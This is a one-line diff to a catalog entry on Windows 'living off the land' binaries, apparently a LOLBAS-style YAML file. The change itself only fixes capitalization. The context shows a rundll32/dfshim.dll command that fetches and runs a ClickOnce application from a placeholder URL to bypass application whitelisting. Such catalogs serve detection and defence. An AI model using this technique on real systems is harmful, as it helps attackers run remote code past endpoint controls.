@@ -7,7 +7,7 @@ Commands:
   - Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo
     Description: Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)
     Usecase: Use binary to bypass Application whitelisting
-    Category: AWL bypass
+    Category: AWL Bypass
     Privileges: User
     MitreID: T1127
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
